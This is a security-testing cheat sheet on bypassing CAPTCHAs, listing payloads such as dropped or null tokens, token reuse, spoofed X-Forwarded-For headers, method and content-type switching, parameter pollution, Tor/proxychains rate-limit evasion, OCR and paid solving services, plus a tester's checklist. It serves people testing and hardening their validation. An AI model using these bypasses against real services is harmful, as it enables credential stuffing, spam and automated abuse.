# CAPTCHA Bypass

Quick reference. CAPTCHAs commonly fail at the SERVER-SIDE check, not at solving the puzzle. Test for missing / weak validation BEFORE OCR / paid-solving services.

## CAPTCHA types

| Type | Vendor | Notes |
|---|---|---|
| reCAPTCHA v2 | Google | Image grid; client+server token |
| reCAPTCHA v3 | Google | Score-based, invisible |
| hCaptcha | Intuition Machines | Image grid; reCAPTCHA alternative |
| Image-based | Various | Distorted text, often OCR-able |
| Behavioral | Various | Mouse / typing biometrics |

## Bypass techniques (try in order)

### 1. Missing server-side validation

```http
POST /login
username=test&password=test         # NO g-recaptcha-response field
```

If the request succeeds, server doesn't validate.

### 2. Empty / null field

```
g-recaptcha-response=
g-recaptcha-response=null
g-recaptcha-response=undefined
g-recaptcha-response[]=
```

### 3. Token reuse

CAPTCHA tokens should be single-use. Test:
```bash
TOKEN=$(solve_captcha)
curl -X POST /login -d "captcha=$TOKEN&user=u1&pass=p1"
curl -X POST /login -d "captcha=$TOKEN&user=u2&pass=p2"   # Same token; should fail
```

### 4. HTTP header manipulation

```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Skip-Captcha: true
X-CSRF-Token: bypass
```

Some servers skip CAPTCHA when localhost / specific source IP detected.

### 5. Content-type conversion

```http
# Original: Content-Type: application/x-www-form-urlencoded
# Try: Content-Type: application/json with same fields
{"username":"test","password":"test"}    # Without captcha field
```

Server may parse JSON differently and skip validation.

### 6. Request method change

```http
GET /login?username=admin&password=admin    (instead of POST)
PUT /login ...
PATCH /login ...
```

### 7. Parameter pollution

```
g-recaptcha-response=valid&g-recaptcha-response=
```

Server may use first or last value.

### 8. Rate-limit evasion

Combine bypass with IP rotation (proxychains / Tor) so CAPTCHA-introduction-after-N-failures never triggers.

### 9. OCR for image-based

```python
import pytesseract
from PIL import Image
text = pytesseract.image_to_string(Image.open('captcha.png'))
```

Modern CAPTCHAs (twisted, noisy) defeat basic OCR. More advanced:
- `ddddocr` (open-source CNN).
- 2captcha / Anti-Captcha (paid services).

### 10. Response manipulation

When client-side checks the response (e.g. `success: true`), modify at proxy:

```
HTTP/1.1 200 OK
{"success":true,"score":0.9}
```

### 11. JavaScript disable

If CAPTCHA is loaded via JS only:
```bash
curl -X POST /login -d "user=admin&pass=admin"   # No-JS submission
```

Server may default to "no captcha required" when JS-set field is absent.

## reCAPTCHA v3 bypass

reCAPTCHA v3 returns a SCORE (0.0–1.0). Bypass:

### Score manipulation

If server uses client-supplied score:
```http
POST /login
g-recaptcha-response=...&recaptcha_score=1.0
```

### Token reuse

```bash
TOKEN=$(get_v3_token)
curl /api1 -d "captcha=$TOKEN"
curl /api2 -d "captcha=$TOKEN"   # Should fail
```

### Action mismatch

```http
# Token was issued for action=login but used for password_reset
g-recaptcha-response=token_for_login_action
# at /password_reset endpoint
```

If server doesn't validate `action`, token works across endpoints.

## hCaptcha bypass

### Missing validation

Same as reCAPTCHA — drop `h-captcha-response` and see if server still accepts.

### Enterprise endpoints

Some apps have separate enterprise endpoints with different validation:
```
/api/login              ← CAPTCHA required
/api/v2/internal/login  ← CAPTCHA bypass
/admin/login            ← may skip CAPTCHA
```

## Testing checklist

**Server-side validation:**
- [ ] Submit without CAPTCHA field — 200 = missing validation.
- [ ] Submit with empty / null / array — server rejects?
- [ ] Token reuse — single-use enforced?
- [ ] Action / domain validation — token bound to context?

**Rate limiting:**
- [ ] CAPTCHA-introduction threshold — N failures before captcha?
- [ ] IP-based vs session-based?
- [ ] Bypass via X-Forwarded-For / proxy chain?

**Token security:**
- [ ] Server-side score check (v3)?
- [ ] Token-to-form binding?
- [ ] Cross-endpoint replay?

## Tools

- 2captcha / Anti-Captcha — paid solving services.
- Buster (browser extension) — auto-solves audio CAPTCHAs.
- ddddocr — Python CNN for image CAPTCHAs.
- Burp Repeater — rapid bypass testing.

## References

- OWASP WSTG-IDNT-04 (Identity Management).
- CWE-863 (Incorrect Authorization).
- Google reCAPTCHA verification: https://developers.google.com/recaptcha/docs/verify
- hCaptcha: https://docs.hcaptcha.com/
